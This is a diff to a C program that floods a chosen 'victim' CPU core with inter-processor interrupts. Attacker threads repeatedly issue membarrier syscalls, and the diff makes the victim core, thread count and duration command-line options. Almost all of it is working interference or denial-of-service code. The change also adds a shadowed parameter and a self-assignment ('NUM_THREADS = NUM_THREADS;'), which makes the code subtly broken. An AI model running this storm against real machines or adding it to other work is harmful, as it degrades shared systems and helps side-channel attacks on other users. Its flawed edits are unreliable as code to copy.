@@ -14,10 +14,10 @@
 #include <string.h>
 #include <linux/membarrier.h>
 
-#define VICTIM_CPU 0
-
-int* thread_args;
 int NUM_THREADS;
+int DURATION_SEC = 10;
+int VICTIM_CPU = 0;
+int* thread_args;
 pthread_t* ipi_storm_threads;
 unsigned long long membarrier_counter = 0;  // Added counter
 
@@ -27,7 +27,7 @@ inline static int membarrier(int cmd, unsigned int flags, int cpu_id)
     return syscall(__NR_membarrier, cmd, flags, cpu_id);
 }
 
-void ipi_register(unsigned long num_threads)
+void ipi_register(unsigned long NUM_THREADS)
 {
     int ret = membarrier(MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0);
     if (ret == -1) {
@@ -39,7 +39,7 @@ void ipi_register(unsigned long num_threads)
         printf("Error %d\n", errno);
         exit(EXIT_FAILURE);
     }
-    NUM_THREADS = num_threads;
+    NUM_THREADS = NUM_THREADS;
     thread_args = malloc(sizeof(int)*(NUM_THREADS));
     ipi_storm_threads = malloc(sizeof(pthread_t*)*(NUM_THREADS));
     for (int i = 2; i < NUM_THREADS+2; i++)
@@ -94,39 +94,43 @@ int kill_ipi()
 
 int main(int argc, char *argv[]) {
     char command[32];
-    int num_threads;
     int running = 0;
-    int duration = 10;
-    int target_cpu = 0;
-    int num_cpus = 23;
+
+    printf("Total membarriers executed: %llu\n", membarrier_counter);
 
     if (argc >= 2) {
-        num_threads = atoi(argv[1]);
-        if (num_threads <= 0) {
+        NUM_THREADS = atoi(argv[1]);
+        if (NUM_THREADS <= 0) {
             fprintf(stderr, "Error: NUM_THREADS must be positive\n");
             return EXIT_FAILURE;
         }
     }
 
     if (argc >= 3) {
-        duration = atoi(argv[2]);
-        if (duration <= 0) {
-            fprintf(stderr, "Error: TEST_DURATION must be positive\n");
+        DURATION_SEC = atoi(argv[2]);
+        if (DURATION_SEC <= 0) {
+            fprintf(stderr, "Error: TEST_DURATION_SEC must be positive\n");
             return EXIT_FAILURE;
         }
     }
 
+    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
+    printf("System has %d CPUs available\n", num_cpus);
+    
     if (argc >= 4) {
-        target_cpu = atoi(argv[3]);
-        if (target_cpu < 0 || target_cpu >= num_cpus) {
-            fprintf(stderr, "Error: TARGET_CPU must be between 0 and %d\n", num_cpus - 1);
+        VICTIM_CPU = atoi(argv[3]);
+        if (VICTIM_CPU < 0 || VICTIM_CPU >= num_cpus) {
+            fprintf(stderr, "Error: VICTIM_CPU must be between 0 and %d\n", num_cpus - 1);
             return EXIT_FAILURE;
         }
     }
 
-    ipi_register(num_threads);
+    printf("Victim core: %d, attackers: %d threads, time: %d s\n",
+           VICTIM_CPU, NUM_THREADS, DURATION_SEC);
+
+    ipi_register(NUM_THREADS);
     begin_ipi_storm();
-    sleep(duration);
+    sleep(DURATION_SEC);
     kill_ipi();
 
     printf("Total membarriers executed: %llu\n", membarrier_counter);  // Print counter
